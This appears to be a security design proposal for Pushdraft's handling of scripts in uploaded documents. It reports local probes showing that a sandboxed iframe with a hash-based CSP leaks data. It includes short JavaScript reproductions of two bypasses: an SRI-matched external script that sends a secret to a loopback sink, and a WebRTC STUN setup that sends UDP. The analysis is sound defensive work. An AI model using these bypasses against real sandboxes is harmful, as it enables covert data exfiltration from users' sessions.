# Draft interactivity

Status: Proposed, user decision pending.

Tracks zpecs S-8 and its human decision task T-2. This proposal changes no runtime
behavior and does not fix or complete S-8. After the user chooses the product
contract, create a separate implementation task with the corresponding browser
acceptance criteria.

Pushdraft currently accepts classical inline scripts during upload, and the
write skill recommends them for interactive documents. Browser responses apply
`script-src 'none'`, so those scripts never execute. The skill also promises a
sandbox that the current response policy does not provide.

Two product contracts remain available:

| Option                 | Consistent behavior                                                                                                                                           | Implementation follow-up                                                                                                                                                                                                                       |
| ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Static documents       | Published documents do not execute JavaScript.                                                                                                                | Reject executable scripts during upload with a clear error, retain disabled execution during delivery, and remove the interactive-script and sandbox claims from the skill. Specify how already stored script-containing drafts are presented. |
| Isolated interactivity | Supported inline scripts work inside their document without access to account sessions, other drafts, persistent storage, external navigation or the network. | Establish a reviewed isolation design and supported-browser policy, then align validation, delivery and skill examples. The simple iframe design tested below does not satisfy this contract.                                                  |

Recommendation for review: do not enable native document scripts under the tested
iframe policy. If a near-term fix is the priority, the static contract has a
smaller implementation scope. Choosing static documents would remove an existing
promise in the skill, so it needs the user's explicit decision. Choosing
interactivity requires further isolation work before enabling scripts.

The interactive candidate was a server-rendered, non-scripted wrapper containing
an `iframe` with `sandbox="allow-scripts"` and an escaped `srcdoc` document. The
wrapper response supplied this policy, which the child inherited:

```http
Content-Security-Policy: default-src 'none'; script-src 'sha256-<accepted-inline-script-hash>'; style-src 'unsafe-inline'; img-src data:; frame-src 'none'; connect-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'
```

Local probes on 2026-09-05 used Playwright 1.62.1, Chromium 151.0.7922.34 and
WebKit 26.5 on macOS. Two loopback HTTP listeners represented the wrapper and an
external destination. A loopback UDP listener recorded STUN packets. All
application requests and test payloads stayed on the local machine; these were
not tests of the deployed service.

| Probe                                                                                                                  | Observed in both tested engines                                                                                                                                                                                                                   |
| ---------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Inline button handler                                                                                                  | Executed and updated the child DOM.                                                                                                                                                                                                               |
| Child origin and parent DOM                                                                                            | Origin was `null`; reading the parent's DOM raised `SecurityError`.                                                                                                                                                                               |
| Cookies and persistent storage                                                                                         | Parent cookie was not exposed. Chromium raised `SecurityError` for cookie access; WebKit returned an empty cookie string. Local storage, session storage and IndexedDB access raised `SecurityError`.                                             |
| Data URL image                                                                                                         | Loaded successfully.                                                                                                                                                                                                                              |
| Fetch, beacon, WebSocket, ordinary external script, image, stylesheet, nested remote frame, object, audio and prefetch | No corresponding HTTP request reached the local destination. A successful `sendBeacon` return value alone did not prove that a request was sent.                                                                                                  |
| Self, parent and top navigation; popup; clicked links; form submission; meta refresh                                   | No destination request or popup occurred, including attempts triggered by a real button click. Parent URL stayed unchanged. Chromium replaced the child with an error document for some blocked self navigations; WebKit retained `about:srcdoc`. |
| `location.hash`                                                                                                        | Changed the child's local fragment without a request.                                                                                                                                                                                             |
| External script with matching integrity metadata                                                                       | **Failed isolation.** An HTTP request containing a test secret reached the destination, and the returned script executed.                                                                                                                         |
| WebRTC data-channel setup with a STUN server                                                                           | **Failed isolation.** Both engines sent UDP packets despite `connect-src 'none'`.                                                                                                                                                                 |

The external-script result follows the CSP specification: a hash source can
permit an external script whose `integrity` metadata matches it. The hash
therefore cannot establish that the script came from an inline element. See
[external JavaScript via hashes](https://www.w3.org/TR/CSP3/#allowing-external-javascript-via-hashes).
The isolation of origin and parent navigation follows the
[iframe sandbox restrictions](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox).

To reproduce the HTTP failure, hash an accepted inline script, place that hash in
the response policy and in the script element's `data-integrity` attribute, then
have the script append an element equivalent to:

```js
if (!document.currentScript.src) {
  const script = document.createElement("script");
  script.src = "http://127.0.0.1:<sink-port>/sri?secret=LOCAL_TEST";
  script.integrity = document.currentScript.dataset.integrity;
  script.crossOrigin = "anonymous";
  document.body.append(script);
}
```

The local destination returns the same script bytes with
`Access-Control-Allow-Origin: *`. The request itself demonstrates network access,
even if the response subsequently fails its integrity check. The document author
can calculate the accepted script's hash before upload; no privileged API is
needed.

To reproduce the UDP failure, start a local UDP listener and execute this from
an allowed inline script in the sandbox:

```js
const peer = new RTCPeerConnection({
  iceServers: [{ urls: "stun:127.0.0.1:<udp-port>" }],
});
peer.createDataChannel("test");
peer.createOffer().then((offer) => peer.setLocalDescription(offer));
```

Adding a second enforced policy, `script-src 'unsafe-inline'`, blocked the HTTP
script request while retaining the hash-approved inline code. This is an
intersection of two policies, not a replacement of the hash policy. Adding
`webrtc 'block'` still did not stop UDP: both tested engines reported that directive
as unrecognized. The current
[CSP draft specifies a separate WebRTC directive](https://www.w3.org/TR/CSP3/#directive-webrtc),
but that specification text is not evidence of support in a browser.

These probes disprove the proposed no-network guarantee. They do not establish
that all other browser APIs are confined. Firefox, DNS traffic, resource-exhaustion
behavior and production deployment settings were not tested. The iframe candidate
must not be shipped or described as safe merely by adding the experimental
WebRTC directive or overriding JavaScript globals.

If the user chooses interactivity, the implementation plan must resolve these
points before acceptance:

- Preserve the authenticated wrapper and opaque child origin. Do not grant
  `allow-same-origin`, popup, top-navigation, form or storage permissions, and do
  not add a privileged message handler that trusts the child.
- Resolve named image references on the server under the same account, version
  and share authorization as the viewed draft, then embed their bytes as data
  URLs. Define response-size limits and how scripts select those embedded images;
  arbitrary script-built reference URLs cannot be safely rewritten as plain text.
- Keep original `/raw` bytes unchanged and script-disabled. Define owner, guest
  and versioned browser delivery consistently with that raw contract.
- Treat upload validation as format validation, not a security boundary for
  arbitrary JavaScript. Scripts can create forbidden elements after validation.
  Do not enable execution until a reviewed design closes network access in every
  supported browser or fails closed where the required protections are absent.
- Run browser acceptance tests for working inline controls and embedded images;
  inaccessible session data, sibling drafts and storage; blocked navigation with
  and without user activation; and blocked HTTP, external-script integrity,
  WebSocket, WebRTC and DNS channels. Observe actual HTTP/UDP/DNS destinations,
  not only browser request events or API return values.
- Document supported script forms, unsupported APIs, reference handling and
  browser behavior in the write skill. Include a browser fixture that matches the
  skill's recommended interactive example.

If the user chooses static documents, the follow-up must instead prove that
script-bearing uploads receive the chosen explicit rejection, accepted static
HTML still renders with authorized references, existing stored scripts remain
disabled on browser and raw routes, and the skill no longer promises execution.
The decision and its implementation remain separate deliverables.
